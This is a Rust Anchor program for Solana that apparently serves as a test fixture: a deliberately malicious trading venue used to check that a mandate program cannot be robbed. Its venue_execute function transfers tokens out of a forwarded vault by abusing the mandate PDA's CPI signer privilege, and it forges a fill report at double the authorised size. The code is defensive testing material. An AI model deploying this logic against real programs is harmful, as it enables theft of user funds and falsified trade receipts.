//! **TEST ONLY. NEVER DEPLOY THIS.**
//!
//! A deliberately malicious venue, written to attack the mandate program from
//! the one position the design has to trust: the callee of a CPI the mandate
//! PDA signed. It exists so that "a venue cannot touch the vault" is a tested
//! claim rather than a comforting one.
//!
//! It attacks two ways, and both attacks worked when it was first written:
//!
//! 1. **Take the collateral.** If it is handed the vault, it transfers out of
//!    it using the mandate PDA as the authority. A CPI carries the caller's
//!    signer privileges to the callee, so inside this program the mandate is a
//!    signer and the token program obeys. It moved 10 of 1,000 base units and
//!    the transaction committed. Gate 15 now refuses to forward the vault at
//!    all, and gate 14 would catch the movement if anything ever got past it.
//!
//! 2. **Lie about the fill.** It reports twice the notional it was asked for,
//!    so the mandate would write a receipt claiming a trade that never
//!    happened at a size nobody authorised. Gate 14 refuses it.
//!
//! Its accounts are deliberately loose — everything past the mandate arrives
//! as `remaining_accounts` — so the mandate program's own account forwarding
//! is what decides which attack is even reachable.
#![allow(unexpected_cfgs)]
#![forbid(unsafe_code)]

use anchor_lang::prelude::*;
use anchor_lang::solana_program::instruction::{AccountMeta, Instruction};
use anchor_lang::solana_program::program::{invoke, set_return_data};
use markov_types::{VenueFill, VenueReport};

// A throwaway id generated for the test. This program is never deployed.
declare_id!("4hFUDMpupHGhNcE39u6bLYSYS4DLs5o5CZ7WnrstkhqK");

#[derive(AnchorSerialize, AnchorDeserialize, Clone, Copy, Debug)]
pub struct VenueExecuteArgs {
    pub action: u8,
    pub market: [u8; 16],
    pub side: u8,
    pub notional: u64,
    pub limit_price: u64,
    pub max_slippage_bps: u16,
}

/// The SPL token `Transfer` discriminator.
const SPL_TRANSFER: u8 = 3;

#[program]
pub mod test_rogue_venue {
    use super::*;

    pub fn venue_execute<'info>(
        ctx: Context<'info, VenueExecute<'info>>,
        args: VenueExecuteArgs,
    ) -> Result<()> {
        // Attack 1, when the caller was careless enough to forward the vault:
        // `[vault, thief, token_program]`.
        if let [vault, thief, token_program, ..] = ctx.remaining_accounts {
            let amount = args.notional.max(1);
            let mut data = vec![SPL_TRANSFER];
            data.extend_from_slice(&amount.to_le_bytes());
            let ix = Instruction {
                program_id: token_program.key(),
                accounts: vec![
                    AccountMeta::new(vault.key(), false),
                    AccountMeta::new(thief.key(), false),
                    // The mandate PDA, which the caller made a signer for this
                    // very instruction.
                    AccountMeta::new_readonly(ctx.accounts.mandate.key(), true),
                ],
                data,
            };
            let attempt = invoke(
                &ix,
                &[
                    vault.clone(),
                    thief.clone(),
                    ctx.accounts.mandate.to_account_info(),
                    token_program.clone(),
                ],
            );
            msg!("rogue venue: theft succeeded -> {}", attempt.is_ok());
            attempt?;
        }

        // Attack 2, always: claim twice the size that was authorised.
        let report = VenueReport::Filled(VenueFill {
            price: args.limit_price,
            notional: args.notional.saturating_mul(2),
            fee: 0,
        });
        let mut bytes = Vec::with_capacity(32);
        report
            .serialize(&mut bytes)
            .map_err(|_| ProgramError::BorshIoError)?;
        set_return_data(&bytes);
        Ok(())
    }
}

#[derive(Accounts)]
pub struct VenueExecute<'info> {
    /// CHECK: the mandate PDA, as handed to any venue. Unvalidated on purpose:
    /// this program is the attacker.
    pub mandate: UncheckedAccount<'info>,
}
